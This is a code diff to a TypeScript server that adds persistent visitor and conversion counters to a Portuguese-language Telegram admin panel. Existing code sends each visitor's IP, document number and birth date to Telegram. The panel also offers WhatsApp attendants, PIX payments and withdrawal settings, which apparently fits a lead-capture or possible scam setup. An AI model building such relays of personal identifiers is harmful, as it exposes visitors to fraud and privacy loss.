@@ -67,6 +67,98 @@ let currentConfig = {
 // Sessions state for Telegram tracking (Persisted)
 const sessions = new Map<string, any>();
 const VISITORS_FILE = path.join(process.cwd(), 'visitor-sessions.json');
+const STATS_FILE = path.join(process.cwd(), 'stats.json');
+
+interface BotStats {
+  totalVisitors: number;
+  visitorsToday: number;
+  visitorsWeek: number;
+  totalConversions: number;
+  conversionsToday: number;
+  conversionsWeek: number;
+  lastResetDay: string; // YYYY-MM-DD
+  lastResetWeek: number; // Week number
+}
+
+let botStats: BotStats = {
+  totalVisitors: 0,
+  visitorsToday: 0,
+  visitorsWeek: 0,
+  totalConversions: 0,
+  conversionsToday: 0,
+  conversionsWeek: 0,
+  lastResetDay: new Date().toISOString().split('T')[0],
+  lastResetWeek: getWeekNumber(new Date())
+};
+
+function getWeekNumber(d: Date) {
+  d = new Date(Date.UTC(d.getFullYear(), d.getMonth(), d.getDate()));
+  d.setUTCDate(d.getUTCDate() + 4 - (d.getUTCDay() || 7));
+  var yearStart = new Date(Date.UTC(d.getUTCFullYear(), 0, 1));
+  var weekNo = Math.ceil((((d.getTime() - yearStart.getTime()) / 86400000) + 1) / 7);
+  return weekNo;
+}
+
+function loadStats() {
+  try {
+    if (fs.existsSync(STATS_FILE)) {
+      const data = JSON.parse(fs.readFileSync(STATS_FILE, 'utf-8'));
+      botStats = { ...botStats, ...data };
+      console.log(`📊 [STATS] Estatísticas carregadas: Total Visitors: ${botStats.totalVisitors}, Conversions: ${botStats.totalConversions}`);
+      checkAndResetStats();
+    }
+  } catch (e) { }
+}
+
+function saveStats() {
+  try {
+    fs.writeFileSync(STATS_FILE, JSON.stringify(botStats, null, 2));
+  } catch (e) { }
+}
+
+function checkAndResetStats() {
+  const now = new Date();
+  const todayStr = now.toISOString().split('T')[0];
+  const currentWeek = getWeekNumber(now);
+
+  let changed = false;
+
+  if (botStats.lastResetDay !== todayStr) {
+    botStats.visitorsToday = 0;
+    botStats.conversionsToday = 0;
+    botStats.lastResetDay = todayStr;
+    changed = true;
+    console.log(`📅 [STATS] Reset diário realizado.`);
+  }
+
+  if (botStats.lastResetWeek !== currentWeek) {
+    botStats.visitorsWeek = 0;
+    botStats.conversionsWeek = 0;
+    botStats.lastResetWeek = currentWeek;
+    changed = true;
+    console.log(`🗓️ [STATS] Reset semanal realizado.`);
+  }
+
+  if (changed) saveStats();
+}
+
+function recordVisitor() {
+  checkAndResetStats();
+  botStats.totalVisitors++;
+  botStats.visitorsToday++;
+  botStats.visitorsWeek++;
+  saveStats();
+}
+
+function recordConversion() {
+  checkAndResetStats();
+  botStats.totalConversions++;
+  botStats.conversionsToday++;
+  botStats.conversionsWeek++;
+  saveStats();
+}
+
+loadStats();
 
 function loadVisitors() {
   try {
@@ -822,6 +914,7 @@ app.post("/api/v1/session/start", async (req, res) => {
   const messageId = await sendTelegram(`<b>👤 NOVO VISITANTE</b>\n\n<b>IP:</b> ${safeIp}\n<b>Device:</b> ${safeDevice}\n<b>Status:</b> 🟢 Navegando...`);
   sessions.set(userId, { messageId: messageId || 0, startTime, lastHeartbeat: startTime, ip: String(ip), device, location: location || 'Brasil', converted: false, docValue: "", birthDate: "" });
   saveVisitors();
+  recordVisitor();
   res.json({ status: "started", userId });
 });
 
@@ -844,6 +937,7 @@ app.post("/api/v1/session/convert", async (req, res) => {
     const msg = `<b>🔥 CONVERSÃO!</b>\n\n<b>IP:</b> ${safeIp}\n<b>Documento:</b> ${details.docValue}\n<b>Nascimento:</b> ${details.birthDate}\n<b>Status:</b> ✅ NO WHATSAPP`;
     await sendTelegram(msg, session.messageId || undefined);
     saveVisitors();
+    recordConversion();
     res.json({ status: "converted" });
   } else res.json({ status: "ignored" });
 });
@@ -911,6 +1005,7 @@ setInterval(async () => {
       sessions.delete(userId);
     }
   }
+  checkAndResetStats();
 }, 30000);
 
 // --- Dashboard Logic ---
@@ -946,19 +1041,14 @@ async function startTelegramPolling() {
 
         if (text === "/start" || text === "/painel" || text === "painel:back" || text === "painel:start") {
           const stats = getBotStatusInfo('main');
+          checkAndResetStats();
 
           const allSessions = Array.from(sessions.values());
-          const totalVisitors = allSessions.length;
           const now = Date.now();
-          const oneDayMs = 24 * 60 * 60 * 1000;
-          const oneWeekMs = 7 * oneDayMs;
 
-          const visitorsToday = allSessions.filter(s => (now - (s.startTime || 0)) <= oneDayMs).length;
-          const visitorsWeek = allSessions.filter(s => (now - (s.startTime || 0)) <= oneWeekMs).length;
-
-          const conversions = allSessions.filter(s => s.converted).length;
           const activeNow = allSessions.filter(s => !s.converted && (now - (s.lastHeartbeat || 0) <= 60000)).length;
-          const abandoned = totalVisitors - conversions - activeNow;
+          const conversionsActive = allSessions.filter(s => s.converted).length;
+          const abandoned = botStats.totalVisitors - botStats.totalConversions - activeNow;
 
           // ... (attendants logic remains same, I'll include it to be sure of the range)
           let attendantsOnline = 0;
@@ -990,13 +1080,15 @@ async function startTelegramPolling() {
             `👤 <b>ATENDENTES CONECTADOS (${attendantsOnline}/${MAX_SLOTS}):</b>` +
             `${attendantsList}\n\n` +
             `📈 <b>MÉTRICAS DE VISITANTES:</b>\n` +
-            `├ 📅 <b>Visitantes (Hoje):</b> ${visitorsToday}\n` +
-            `├ 🗓️ <b>Visitantes (Semana):</b> ${visitorsWeek}\n` +
-            `└ 🌐 <b>Visitantes (Total):</b> ${totalVisitors}\n\n` +
+            `├ 📅 <b>Visitantes (Hoje):</b> ${botStats.visitorsToday}\n` +
+            `├ 🗓️ <b>Visitantes (Semana):</b> ${botStats.visitorsWeek}\n` +
+            `└ 🌐 <b>Visitantes (Total):</b> ${botStats.totalVisitors}\n\n` +
             `📊 <b>CONVERSÃO E RETENÇÃO:</b>\n` +
             `├ 👥 <b>Ativos no Site:</b> ${activeNow}\n` +
             `├ ❌ <b>Abandonos:</b> ${abandoned}\n` +
-            `└ ✅ <b>Leads WhatsApp:</b> ${conversions}\n\n` +
+            `├ ✅ <b>Leads (Hoje):</b> ${botStats.conversionsToday}\n` +
+            `├ ✅ <b>Leads (Semana):</b> ${botStats.conversionsWeek}\n` +
+            `└ ✅ <b>Leads (Total):</b> ${botStats.totalConversions}\n\n` +
             `👥 <b>FILA ATUAL:</b> ${getQueueInfo().length} leads aguardando\n` +
             `🕒 <b>HORA:</b> ${new Date().toLocaleTimeString('pt-BR', { timeZone: 'America/Sao_Paulo' })}\n` +
             `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
@@ -1006,7 +1098,7 @@ async function startTelegramPolling() {
             inline_keyboard: [
               [{ text: "📊 Atualizar Métricas", callback_data: "painel:start" }, { text: "👥 Gerenciar Fila", callback_data: "painel:fila" }],
               [{ text: "💰 Painel Financeiro", callback_data: "painel:financeiro_auth" }, { text: "📧 Configurar SMTP", callback_data: "painel:config_smtp" }],
-              [{ text: "⚡ PIX Rápido", callback_data: "cmd:last_pix" }, { text: "🛠️ Configurações de Saque", callback_data: "painel:config_pix" }],
+              [{ text: "⚡ PIX Rápido", callback_data: "cmd:last_pix" }, { text: "🛠️ Config Gateway", callback_data: "painel:config_pix" }],
               [{ text: "📱 Gestão de WhatsApp", callback_data: "painel:slots" }, { text: "🔄 Reiniciar Main", callback_data: "painel:reiniciar:slot:main" }]
             ]
           };
